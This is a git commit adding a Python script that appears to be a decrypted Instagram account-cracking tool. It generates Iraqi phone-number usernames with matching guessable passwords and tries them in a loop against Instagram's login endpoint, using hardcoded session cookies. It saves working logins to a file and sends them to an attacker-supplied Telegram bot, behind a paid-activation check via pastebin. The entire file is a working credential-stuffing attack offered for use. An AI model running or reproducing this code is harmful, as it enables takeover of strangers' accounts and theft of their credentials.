30882b48b74a3ed3dfa33ff0118a8b5d907bfbb0
Sidra ELEzz <76815358+SidraELEzz@users.noreply.github.com>
2021-07-26 00:38:03 +0300

    Create Mo2_enc.py

---
+++ ماهيب (@ X888E)/Mo2_enc.py
@@ -0,0 +1,133 @@
+# Decrypt By Sidra ELEzz
+# Github : https://github.com/SidraELEzz
+# Telegram: https://t.me/TT_RQ
+#It is not good for your personality that everything in you is great except for your mind
+import os
+try:
+    import uuid
+except:
+    os.system('pip install uuid')
+else:
+    try:
+        from random import *
+    except:
+        os.systeam('pip install random ')
+    else:
+        try:
+            import string
+        except:
+            os.system('pip install string')
+        else:
+            try:
+                import requests
+            except:
+                os.system('pip install requests ')
+            else:
+                try:
+                    from user_agent import generate_user_agent
+                except:
+                    os.system('pip install user_agent ')
+                else:
+                    try:
+                        from datetime import datetime
+                    except:
+                        os.system('pip install datetime ')
+                    else:
+                        try:
+                            import time
+                        except:
+                            os.system('pip install time')
+                        else:
+                            os.system('clear')
+                            import pyfiglet, os
+                            from time import sleep
+                            import webbrowser
+                            Z = '\x1b[2;31m'
+                            G = '\x1b[1;32m'
+                            sleep(2)
+                            P55 = pyfiglet.figlet_format('Marko')
+                            print(Z + P55)
+                            sleep(4)
+                            os.system('clear')
+                            sleep(2)
+                            bnar = pyfiglet.figlet_format('wael')
+                            print(G + bnar)
+                            sleep(1)
+                            import random, uuid, requests, string
+                            from user_agent import generate_user_agent
+                            from datetime import datetime
+                            from random import *
+                            from time import sleep
+                            import requests, os, random, json, threading, secrets, uuid
+                            from colorama import Fore, Style
+                            from time import sleep
+                            from datetime import datetime
+                            from secrets import token_hex
+                            from uuid import uuid4
+                            from user_agent import generate_user_agent
+                            trs = [
+                             'https://t.me/SidraTOOLS', 'https://t.me/SidraTOOLS']
+                            uaas = random.choice(trs)
+                            webbrowser.open(uaas)
+                            aa = 0
+                            zz = 0
+                            E = '\x1b[1;31m'
+                            G = '\x1b[1;32m'
+                            S = '\x1b[1;33m'
+                            ID = input(S + '𝐈𝐃 ➥ ==> : ')
+                            tok = input(G + '𝐓𝐎𝐊𝐄𝐍 ➥ ==> : ')
+                            w = 'https://pastebin.com/raw/D2sc9SRm'
+                            start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=LODING..... ⏸️").json()
+                            id_msg = start_msg['result']['message_id']
+                            rss = requests.get(w).text
+if 'Sidra' in rss:
+    sleep(0.1)
+    print(G + 'Login…')
+    sleep(0.1)
+    r = requests.Session()
+    user = '1234567890'
+    while True:
+        while True:
+            us = str(''.join((random.choice(user) for i in range(8))))
+            username = '+96477' + us
+            password = '077' + us
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            headers = {'accept':'*/*', 
+             'accept-encoding':'gzip, deflate, br', 
+             'accept-language':'en-US,en;q=0.9', 
+             'content-length':'312', 
+             'content-type':'application/x-www-form-urlencoded', 
+             'cookie':'mid=YN7HNwALAAE44AHwKGi_n23OPpeL; ig_did=BB483834-B0C3-4F0F-8685-CCE1FD4E9884; ig_nrcb=1; csrftoken=nDZd4I8GhxpOgXnv7j5XO88SexqajXW4', 
+             'origin':'https://www.instagram.com', 
+             'referer':'https://www.instagram.com/accounts/login/', 
+             'sec-ch-ua':'" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"', 
+             'sec-ch-ua-mobile':'?0', 
+             'sec-fetch-dest':'empty', 
+             'sec-fetch-mode':'cors', 
+             'sec-fetch-site':'same-origin', 
+             'user-agent':generate_user_agent(), 
+             'x-asbd-id':'437806', 
+             'x-csrftoken':'nDZd4I8GhxpOgXnv7j5XO88SexqajXW4', 
+             'x-ig-app-id':'936619743392459', 
+             'x-ig-www-claim':'0', 
+             'x-instagram-ajax':'43db9c8be60f', 
+             'x-requested-with':'XMLHttpRequest'}
+            data = {'username':username, 
+             'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password), 
+             'queryParams':'{}'}
+            req_login = r.post(url, headers=headers, data=data)
+            if 'userId' in req_login.text:
+                zz += 1
+                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
+                tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=BY → @SidraTOOLS  ✓\n𝑬𝒎𝑨𝒊𝑳 : [ → {username} ← ]\n 𝒑𝒂𝒔𝒔𝒘𝒐𝒓𝒅 : [ → {password} ← ]\n- 𝐅𝐫𝐎𝐦 : @SidraTOOLS - @SidraTOOLS \n𝐅𝐫𝐎𝐦 → @SidraTOOLS | @SidraTOOLS ⁉️ "
+                i = requests.post(tlg)
+                with open('insta.txt', 'a') as HACKED:
+                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
+
+        requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - شروحات فرقة MAX . \n المهيب ✅ [{zz}] \n------------------------------------------\n 𝐌𝐀𝐑𝐊𝐎 ❌ [{aa}]  ( {username} ) \n 𝐓𝐄𝐋𝐄 →  @SidraTOOLS | @SidraTOOLS 🔰 \n𝐅𝐫𝐎𝐦 → @SidraTOOLS | @SidraTOOLS ⁉️")
+        aa += 1
+
+else:
+    print('نهتت الفترة المجانية راسل المطور لتفعيل ')
+    print('معرف المطورين')
+    print('@SidraTOOLS \n@BBDZZ')
